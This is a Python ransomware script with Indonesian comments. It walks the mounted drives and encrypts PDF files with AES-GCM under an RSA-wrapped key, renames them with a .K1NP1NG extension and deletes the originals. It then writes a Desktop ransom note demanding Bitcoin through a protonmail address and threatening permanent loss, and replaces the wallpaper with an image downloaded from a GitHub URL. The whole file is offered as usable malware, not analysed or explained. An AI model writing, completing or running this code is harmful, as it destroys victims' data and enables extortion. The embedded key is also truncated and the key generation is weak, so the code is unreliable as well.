import os
import random
import psutil
import urllib.request
import ctypes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

ENCRYPTION_LEVEL = 32  # AES-256 memerlukan 32 byte key (256 bits)
ENCRYPTED_EXTENSIONS = (".pdf")  # Tambahkan ekstensi sesuai kebutuhan

# String kunci publik dalam format PEM
PUBLIC_KEY_PEM = b"""
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxuk9f1s0IywHATB9Q/Nm
Rn8UeRe
-----END PUBLIC KEY-----
"""

# Fungsi untuk memuat kunci publik dari string PEM
def load_public_key():
    public_key = serialization.load_pem_public_key(
        PUBLIC_KEY_PEM,
        backend=default_backend()
    )
    return public_key

# Fungsi untuk mengenkripsi satu file
def encrypt_file(aes_key, public_key, file_path):
    try:
        iv = os.urandom(12)  # Generate IV untuk mode AES-GCM
        cipher = Cipher(algorithms.AES(aes_key), modes.GCM(iv), backend=default_backend())
        encryptor = cipher.encryptor()

        with open(file_path, 'rb') as f:
            data = f.read()

        ciphertext = encryptor.update(data) + encryptor.finalize()
        tag = encryptor.tag

        # Enkripsi AES key dengan kunci publik RSA
        encrypted_aes_key = public_key.encrypt(
            aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        # Simpan AES key yang terenkripsi, IV, tag, dan ciphertext ke file baru dengan ekstensi .K1NP1NG
        encrypted_file_path = file_path + '.K1NP1NG'
        with open(encrypted_file_path, 'wb') as f_out:
            f_out.write(iv)
            f_out.write(encrypted_aes_key)
            f_out.write(tag)
            f_out.write(ciphertext)

        # Hapus file asli
        os.remove(file_path)

        return True, f"{file_path} berhasil dienkripsi menjadi {encrypted_file_path}"

    except Exception as e:
        return False, f"Gagal mengenkripsi {file_path}: {e}"

# Fungsi untuk mengenkripsi seluruh partisi yang terdeteksi
def encrypt_partitions():
    public_key = load_public_key()

    # Ambil semua partisi yang terpasang
    partitions = psutil.disk_partitions()

    for partition in partitions:
        # Abaikan partisi sistem atau yang tidak valid
        if 'system' in partition.opts or partition.fstype == '':
            continue

        # Enkripsi semua file dengan ekstensi tertentu di partisi yang relevan
        for root, _, files in os.walk(partition.mountpoint):
            for file in files:
                # Periksa apakah file memiliki ekstensi yang sesuai
                if file.lower().endswith(ENCRYPTED_EXTENSIONS):
                    file_path = os.path.join(root, file)
                    aes_key = generate_aes_key()
                    success, message = encrypt_file(aes_key, public_key, file_path)
                    print(message)

# Fungsi untuk menghasilkan kunci AES
def generate_aes_key():
    key = ''.join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+`~") for _ in
                  range(ENCRYPTION_LEVEL))
    return key.encode('utf-8')

def note():
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    note_path = os.path.join(desktop_path, 'M4J0M1N-N0T3.txt')
    with open(note_path, 'w') as f:
        f.write(f'''Harddisk komputer Anda telah dienkripsi dengan algoritma enkripsi kelas Militer.
Tidak ada cara untuk memulihkan data Anda tanpa kunci khusus.
Hanya kami yang dapat mendekripsi file Anda!

Untuk membeli kunci dan memulihkan data Anda, ikuti tiga langkah mudah berikut:

1. Kirim email ke GetYourFilesBack@protonmail.com

2. Anda akan menerima alamat BTC pribadi untuk pembayaran.

Setelah pembayaran selesai, kirim email lain ke GetYourFilesBack@protonmail.com dengan keterangan "DIBAYAR".

Kami akan memeriksa apakah pembayaran telah dilakukan.

3. Anda akan menerima file teks dengan KUNCI Anda yang akan membuka kunci semua file Anda.

PENTING: Untuk mendekripsi file Anda, letakkan file teks di desktop dan tunggu. Tak lama kemudian, semua file akan mulai didekripsi.

PERINGATAN:
JANGAN mencoba mendekripsi file Anda dengan perangkat lunak apa pun karena perangkat lunak tersebut sudah usang dan tidak akan berfungsi, dan mungkin akan lebih mahal untuk membuka kunci file Anda.
JANGAN mengubah nama file, mengutak-atik file, atau menjalankan perangkat lunak dekripsi karena akan lebih mahal untuk membuka kunci file Anda--dan ada kemungkinan besar Anda akan kehilangan file Anda selamanya.

JANGAN mengirim tombol "BAYAR" tanpa membayar, harga AKAN naik jika tidak patuh.

JANGAN berpikir bahwa kami tidak akan menghapus file Anda sama sekali dan membuang kuncinya jika Anda menolak membayar. KAMI AKAN.''')
    return note_path


def change_desktop_background():
    imageUrl = 'https://raw.githubusercontent.com/ArenaldyP/PCAP-File-Analisis-Jalur-Malware/main/output/majomin.jpg'

    # Mendapatkan path ke TEMP folder
    temp_path = os.path.join(os.environ['TEMP'], 'majomin.jpg')

    # Mengunduh dan menyimpan gambar ke TEMP folder
    urllib.request.urlretrieve(imageUrl, temp_path)

    # Mengubah latar belakang desktop
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, temp_path, 3)

if __name__ == "__main__":
    encrypt_partitions()
    note()
    change_desktop_background()